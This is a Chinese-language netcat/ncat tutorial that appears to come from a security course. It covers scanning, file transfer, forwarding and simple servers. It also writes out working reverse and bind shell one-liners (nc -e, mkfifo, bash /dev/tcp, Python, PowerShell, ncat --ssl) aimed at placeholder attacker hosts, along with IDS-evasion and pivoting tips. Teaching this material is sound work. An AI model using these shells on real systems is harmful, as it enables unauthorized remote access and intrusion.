# Netcat TCP/IP 网络瑞士军刀完全指南

> 分类：工具指南 | 难度：入门→进阶 | 阅读时间：约40分钟

## 概述

Netcat（nc）被称为"TCP/IP 瑞士军刀"，是最基础也最强大的网络工具之一。它最初由 Hobbit 于 1995 年发布，能够通过 TCP 或 UDP 读写网络连接。无论是端口扫描、文件传输、反弹 Shell、端口转发、简易聊天，还是网络调试，netcat 都能轻松应对。虽然功能简单，但灵活性极高，是每个安全从业者工具箱中的必会工具。

**常见变体**：
- **GNU Netcat（netcat-traditional）**：经典版本
- **OpenBSD Netcat（netcat-openbsd）**：功能最全，支持 IPv6、Unix Socket
- **Ncat**：Nmap 项目出品，支持 SSL 加密和代理

## 核心知识点

- 端口扫描与 Banner 抓取
- 文件传输
- 反弹 Shell / 绑定 Shell
- 端口转发与代理
- 简易服务端（HTTP/FTP/Telnet 模拟）
- 与系统管道的组合技巧
- Ncat 的 SSL 加密功能

---

## 一、安装

```bash
# Kali Linux / Debian / Ubuntu
sudo apt install netcat-openbsd -y      # OpenBSD 版（推荐）
sudo apt install netcat-traditional -y   # 传统版
sudo apt install ncat -y                 # Nmap 版本

# macOS
brew install netcat

# 命令差异
# netcat-openbsd: nc
# netcat-traditional: nc.traditional 或 nc（软链接）
# ncat: ncat

# 对比版本
nc -h            # OpenBSD/传统版
ncat -h          # Ncat
```

---

## 二、端口扫描与连接测试

### 2.1 端口扫描

```bash
# 扫描单端口
nc -zv 192.168.1.1 80     # -z: 仅扫描不发送数据, -v: 详细输出

# 扫描端口范围
nc -zv 192.168.1.1 20-100
nc -zv 192.168.1.1 22 80 443 8080

# UDP 扫描
nc -zuv 192.168.1.1 53
nc -zuv 192.168.1.1 161-162

# 超时设置
nc -zv -w 3 192.168.1.1 80     # 3 秒超时
```

### 2.2 Banner 抓取（服务版本探测）

```bash
# 连接服务并获取 Banner
nc 192.168.1.1 22       # SSH 通常会显示版本：SSH-2.0-OpenSSH_8.9
nc 192.168.1.1 80       # 连接后手动输入 GET / HTTP/1.0

# HTTP 请求
echo -e "GET / HTTP/1.0\r\nHost: 192.168.1.1\r\n\r\n" | nc 192.168.1.1 80

# HTTPS（需要 openssl）
openssl s_client -connect target.com:443 -servername target.com </dev/null

# SMTP
echo "HELO test.com" | nc 192.168.1.1 25

# FTP
nc 192.168.1.1 21       # 通常会显示 FTP 欢迎信息：220 ProFTPD...
```

### 2.3 端口连通性测试

```bash
# 测试到某个端口的连通性
nc -w 5 192.168.1.1 3306 < /dev/null && echo "Port is open" || echo "Port is closed"

# 测试连接并打印输出
echo "QUIT" | nc 192.168.1.1 25
```

---

## 三、文件传输

### 3.1 基础文件传输

```bash
# === 发送端（Server） ===
# 监听端口并发送文件
nc -l -p 1234 < file.txt

# 压缩发送
tar czf - /important_dir/ | nc -l -p 1234

# === 接收端（Client） ===
# 连接并接收
nc 192.168.1.1 1234 > file.txt

# 接收并解压
nc 192.168.1.1 1234 | tar xzf -

# === 场景：取证时从目标机器传文件 ===
# 攻击机（接收）：nc -l -p 1234 > evidence.zip
# 目标机（发送）：nc 10.0.0.5 1234 < evidence.zip
```

### 3.2 磁盘镜像传输

```bash
# 通过网络传输整个磁盘镜像
# 接收端
nc -l -p 1234 | dd of=/backup/disk.img bs=4M

# 发送端
dd if=/dev/sda bs=4M | nc 接收IP 1234

# 带进度显示
# 接收端
nc -l -p 1234 | pv > disk.img

# 发送端
dd if=/dev/sda bs=4M | pv | nc 接收IP 1234
```

---

## 四、反弹 Shell 与绑定 Shell

### 4.1 反弹 Shell（Reverse Shell）

```bash
# === 攻击机（监听） ===
nc -l -p 4444
# 或使用 -k（keep listening，连接断开后继续监听）
nc -lvnp 4444

# === 目标机（发起连接） ===

# Linux
nc 攻击IP 4444 -e /bin/bash       # 传统 Netcat 的 -e 选项
nc 攻击IP 4444 -e /bin/sh

# 如果 -e 不可用（OpenBSD 版移除），使用管道：
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 攻击IP 4444 >/tmp/f

# Bash 反弹 Shell
bash -i >& /dev/tcp/攻击IP/4444 0>&1

# Python 反弹 Shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("攻击IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Windows (Ncat)
ncat 攻击IP 4444 -e cmd.exe
```

### 4.2 绑定 Shell（Bind Shell）

```bash
# === 目标机（绑定 Shell 到本地端口） ===
nc -l -p 4444 -e /bin/bash          # 传统版
# 或
mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l -p 4444 >/tmp/f

# === 攻击机（连接） ===
nc 目标IP 4444

# 安全提示：绑定 Shell 容易被防火墙拦截
```

### 4.3 Ncat SSL 加密 Shell

```bash
# 攻击机（生成 SSL 证书 + 监听）
ncat --ssl -l -p 4444

# 目标机（SSL 加密连接）
ncat --ssl 攻击IP 4444 -e /bin/bash

# 更安全的加密连接，能绕过基于明文检测的 IDS/IPS
```

---

## 五、端口转发与代理

### 5.1 简易端口转发

```bash
# 正像转发：将本地端口转发到远程
mkfifo pipe1 pipe2
nc -l -p 8080 < pipe1 | nc remote_host 80 > pipe2 &
# 访问 localhost:8080 → 转发到 remote_host:80

# 反向转发：将远程端口映射到本地
# 使用 socat 更合适（推荐）
socat TCP-LISTEN:8080,fork TCP:remote_host:80
```

### 5.2 Ncat 代理功能

```bash
# Ncat 支持 HTTP/CONNECT 和 SOCKS4/SOCKS5 代理
ncat --proxy 10.0.0.1:8080 --proxy-type http target.com 80

# 作为 SOCKS5 代理服务器（需要后台服务支持）
```

### 5.3 内网穿透（跳板机）

```bash
# 场景：攻击机无法直接访问内网主机，但可以连接到边缘服务器
# 在边缘服务器（跳板机）上做转发

# 跳板机上（监听并将流量转发到内网）
mkfifo backpipe
nc -l -p 3389 0<backpipe | nc 10.10.0.100 3389 1>backpipe

# 攻击机连接跳板机的 3389 端口，实际访问的是内网的 RDP
```

---

## 六、网络调试与诊断

### 6.1 简易聊天

```bash
# 服务端
nc -l -p 1234

# 客户端
nc 服务端IP 1234

# 双方都可以直接输入文字聊天
```

### 6.2 HTTP 请求测试

```bash
# GET 请求
printf "GET / HTTP/1.0\r\nHost: target.com\r\n\r\n" | nc target.com 80

# POST 请求
printf "POST /api/login HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/json\r\nContent-Length: 35\r\n\r\n{\"user\":\"admin\",\"pass\":\"123\"}" | nc target.com 80

# 自定义任意请求头
printf "GET /admin HTTP/1.1\r\nHost: target.com\r\nX-Forwarded-For: 127.0.0.1\r\n\r\n" | nc target.com 80
```

### 6.3 模拟简易服务器

```bash
# 模拟 HTTP 服务器（返回固定内容）
while true; do
    echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h1>Hello</h1>" | nc -l -p 8080 -q 1
done

# 单行版本
while true; do echo -e "HTTP/1.1 200 OK\n\n Hello" | nc -l -p 8080 -q 1; done

# 返回日期
while true; do echo -e "HTTP/1.1 200 OK\n\n $(date)" | nc -l -p 8080 -q 1; done
```

---

## 七、Ncat 特色功能（Nmap 版本）

```bash
# SSL/TLS 加密通信
ncat --ssl -l -p 4444              # 服务端
ncat --ssl 服务端IP 4444            # 客户端

# 允许仅接收特定来源的连接
ncat --allow 192.168.1.100 -l -p 4444
ncat --allow 192.168.1.0/24 -l -p 4444

# 限制最大连接数
ncat --max-conns 5 -l -p 4444

# 执行命令
ncat --exec "/bin/bash" -l -p 4444

# 通过代理连接
ncat --proxy proxy_ip:8080 --proxy-type http target_host 80

# 连接代理
ncat -l -p 1080 --proxy-type socks5    # 作为SOCKS5代理
```

---

## 八、安全化使用

```bash
# OpenBSD netcat（推荐）移除了 -e 危险选项
# 使用 nc.traditional 需要谨慎

# 始终在授权范围内使用
# 反弹 Shell 和绑定 Shell 仅用于授权的渗透测试
# 生产环境调试请使用 SSH 隧道（更安全）
```

---

## 九、nc vs socat vs ncat

| 特性 | Netcat | Socat | Ncat |
|:---|:---|:---|:---|
| 安装 | 最小 | 中型 | Nmap 自带 |
| SSL/TLS | ❌（传统）| ✅ | ✅ |
| 端口转发 | 间接 | ✅ 原生 | ✅ |
| IPv6 | ✅(OpenBSD) | ✅ | ✅ |
| Fork/多连接 | ❌ | ✅ | ✅ |
| 代理支持 | ❌ | ✅ | ✅ |
| 复杂度 | 极简 | 复杂 | 中等 |
| 适用场景 | 快速调试 | 复杂转发 | SSL+代理 |

---

## 十、速查卡

```
端口扫描：       nc -zv IP PORT
端口范围：       nc -zv IP PORT1-PORT2
UDP 扫描：       nc -zuv IP PORT
Banner 抓取：     nc IP PORT  # 然后输入协议命令
监听端口：       nc -l -p PORT
接收文件：       nc -l -p PORT > file
发送文件：       nc IP PORT < file
反弹Shell(目标): nc 攻击IP 4444 -e /bin/bash
监听Shell(攻击): nc -l -p 4444
管道反弹:        mknod pipe p; /bin/sh 0<pipe | nc IP PORT 1>pipe
Ncat SSL 监听:   ncat --ssl -l -p PORT
Ncat SSL 连接:   ncat --ssl IP PORT -e /bin/bash
Keeplistening:   -k
超时:            -w SECONDS
```

---

## 实战场景扩展

### 场景五：端口扫描

```bash
# TCP 端口扫描（连接测试）
nc -zv 192.168.1.100 80
nc -zv 192.168.1.100 20-100

# UDP 端口扫描
nc -zuv 192.168.1.100 53
nc -zuv 192.168.1.100 100-200

# 带超时的扫描
nc -zv -w 2 192.168.1.100 1-1024 2>&1 | grep succeeded
```

### 场景六：文件传输

```bash
# 接收端
nc -l -p 4444 > received_file.zip

# 发送端
nc 192.168.1.100 4444 < file_to_send.zip

# 带进度和压缩的传输
# 发送端
tar czf - /path/to/dir | nc 192.168.1.100 4444

# 接收端
nc -l -p 4444 | tar xzf - -C /destination/

# 带校验的传输
# 发送端
cat file | nc 192.168.1.100 4444 && md5sum file

# 接收端
nc -l -p 4444 > file && md5sum file
```

### 场景七：反向 Shell（各类变种）

```bash
# 标准反向 shell
# 攻击机（监听）
nc -lvnp 4444
# 目标机
nc 192.168.1.100 4444 -e /bin/bash

# Bash 反向 Shell（无 nc 的 Linux 目标）
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

# PowerShell 反向 Shell（Windows 目标）
powershell -c "$client=New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Python 反向 Shell
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.1.100',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"

# 加密反向 Shell（ncat --ssl）
# 攻击机
ncat --ssl -lvnp 4444
# 目标机
ncat --ssl 192.168.1.100 4444 -e /bin/bash
```

### 场景八：简易 HTTP 服务器

```bash
# 单文件服务
while true; do
  echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n" | \
    nc -l -p 8080 -q 1
done

# 返回自定义内容
while true; do
  echo -e "HTTP/1.1 200 OK\r\n\r\n$(date)" | nc -l -p 8080 -q 1
done

# 简易文件下载
while true; do
  (echo -ne "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\n\r\n"; \
   cat /path/to/file.tar.gz) | nc -l -p 8080 -q 1
done
```

### 场景九：Banner 抓取

```bash
# HTTP Banner
echo -e "GET / HTTP/1.0\r\n\r\n" | nc target.com 80

# SMTP Banner
echo -e "EHLO test\r\n" | nc target.com 25

# FTP Banner
echo "" | nc target.com 21

# SSH Banner
nc target.com 22 | head -1

# MySQL Banner
nc target.com 3306 | xxd | head
```

### 场景十：端口转发/代理

```bash
# 简易 TCP 代理（管道双向转发）
mkfifo backpipe
nc -l -p 8080 0<backpipe | nc target.com 80 1>backpipe

# 使用 ncat 实现正向代理
ncat -l --proxy-type http localhost 8080

# 使用 ncat 连接代理链
ncat --proxy 127.0.0.1:1080 --proxy-type socks5 target.com 443
```

---

## ncat 高级特性

```bash
# 访问控制（白名单）
ncat -l --allow 192.168.1.0/24 -p 4444
ncat -l --allow 192.168.1.100 --allow 192.168.1.101 -p 4444

# 隐藏 banner
ncat -l --no-shutdown -p 4444

# 连接计数限制
ncat -l --max-conns 3 -p 4444

# 执行命令后退出
ncat --exec "/bin/bash -c 'echo Access Denied; exit'" -l -p 4444

# 记录所有连接
ncat -l -p 4444 --chat -o sessions.log
```

---

> 📖 本文为"网安百宝箱"课程配套读物。更新于 2026-06-18
